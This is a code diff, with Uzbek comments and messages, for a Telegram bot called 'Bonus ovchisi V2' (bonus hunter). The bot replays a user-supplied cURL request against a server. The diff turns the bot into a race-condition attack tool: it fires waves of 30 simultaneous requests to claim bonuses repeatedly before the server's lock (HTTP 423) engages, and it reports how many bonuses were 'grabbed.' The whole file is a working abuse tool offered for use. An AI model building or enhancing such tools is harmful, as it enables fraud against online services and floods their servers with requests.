@@ -7,8 +7,8 @@ import time
 import os
 import re
 import json
+import concurrent.futures # ASOSIY QUROL: Bir vaqtda o'nlab hujum qilish uchun
 
-# Tokenni Render'dan oladi
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask('')
@@ -20,14 +20,12 @@ def home():
 def run_web():
     app.run(host='0.0.0.0', port=8080)
 
-# Foydalanuvchilar ma'lumotlarini saqlash
 users_data = {}
-# Parallel oqimlarni nazorat qilish uchun qulf (Lock)
 lock = threading.Lock()
 
 def get_main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = types.KeyboardButton("🚀 Hujumni boshlash")
+    btn1 = types.KeyboardButton("🚀 Portlovchi Hujum") # Tugma nomini o'zgartirdik
     btn2 = types.KeyboardButton("🛑 To'xtatish")
     btn3 = types.KeyboardButton("⚙️ Sozlamalarni ko'rish")
     markup.add(btn1, btn2, btn3)
@@ -56,32 +54,49 @@ def attack(chat_id):
     if not user:
         return
     
-    # Hujum boshlanishida is_running kafolatlanadi
-    while user.get("is_running"):
+    # Tezlikni maksimal qilish uchun Session ishlatamiz (TCP ulanish qayta-qayta ochilmaydi)
+    session = requests.Session()
+    
+    bot.send_message(chat_id, "🌪 Sinxron hujum ishga tushdi! So'rovlar bir millisoniyada yuborilmoqda...")
+    
+    success_count = 0
+    lock_count = 0
+
+    # Bitta oqim bajaradigan mitti vazifa
+    def send_req():
+        nonlocal success_count, lock_count
+        if not user.get("is_running"):
+            return
         try:
-            # timeout=5 so'rov osilib qolmasligi uchun
-            response = requests.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
+            resp = session.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
+            if resp.status_code == 200:
+                success_count += 1
+            elif resp.status_code == 423:
+                lock_count += 1
+        except:
+            pass
+
+    # Asosiy portlatish sikli
+    while user.get("is_running"):
+        # Bir vaqtning o'zida 30 ta parallel so'rovni serverga uramiz
+        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+            futures = [executor.submit(send_req) for _ in range(30)]
+            concurrent.futures.wait(futures) # 30 tasi tugashini kutamiz
             
-            if response.status_code == 423:
-                bot.send_message(chat_id, "⚠️ Limit tugadi (423). Hujum to'xtatildi.")
-                user["is_running"] = False
-                break
+        # Agar server yopishga ulgurgan bo'lsa (423 xatosi qaytsa)
+        if lock_count > 0:
+            bot.send_message(chat_id, f"⚠️ Server himoyasi (423) ishga tushdi.\n✅ Ammo undan oldin yulib olingan bonuslar: **{success_count}** ta!\n\nHujum avtomatik to'xtatildi.", parse_mode="Markdown")
+            user["is_running"] = False
+            break
             
-            # Agar foydalanuvchi "To'xtatish"ni bossa, darhol sikldan chiqish
-            if not user.get("is_running"):
-                break
-                
-        except Exception:
-            time.sleep(1) # Xato bo'lsa biroz kutish
-            continue
-        
-        time.sleep(0.08) # Optimal tezlik
+        # Agar yopilmagan bo'lsa, navbatdagi 30 ta to'lqinni yuborishdan oldin 0.2 soniya nafas olamiz
+        time.sleep(0.2)
 
 @bot.message_handler(commands=['start'])
 def start(message):
     bot.send_message(
         message.chat.id, 
-        "👋 **Bonus ovchisi** qayta tiklandi!\n\nEndi hujumlar qat'iy nazorat ostida. cURL yuboring:",
+        "👋 **Bonus ovchisi V2** (Portlash rejimi)!\n\nEndi bot so'rovlarni ketma-ket emas, bir millisoniyada bir nechta yuboradi. cURL yuboring:",
         reply_markup=get_main_menu(),
         parse_mode="Markdown"
     )
@@ -95,26 +110,23 @@ def handle_curl(message):
     else:
         bot.reply_to(message, "❌ cURL noto'g'ri.")
 
-@bot.message_handler(func=lambda message: message.text in ["🚀 Hujumni boshlash", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
+@bot.message_handler(func=lambda message: message.text in ["🚀 Portlovchi Hujum", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
 def handle_menu(message):
     chat_id = message.chat.id
     user = users_data.get(chat_id)
 
-    if message.text == "🚀 Hujumni boshlash":
+    if message.text == "🚀 Portlovchi Hujum":
         if not user:
             bot.send_message(chat_id, "Oldin `cURL` yuboring!")
             return
         
-        # ASOSIY TO'G'IRLASH: Parallel oqim ochilishini cheklash
         with lock:
             if user.get("is_running"):
-                bot.send_message(chat_id, "⚠️ Hujum allaqachon ketyapti! Parallel oqim ochish bloklandi.")
+                bot.send_message(chat_id, "⚠️ Hujum allaqachon ketyapti!")
                 return
             user["is_running"] = True
         
-        # Daemon=True bot to'xtaganda oqimni ham yopadi
         threading.Thread(target=attack, args=(chat_id,), daemon=True).start()
-        bot.send_message(chat_id, "🚀 Hujum boshlandi!")
 
     elif message.text == "🛑 To'xtatish":
         if user and user.get("is_running"):
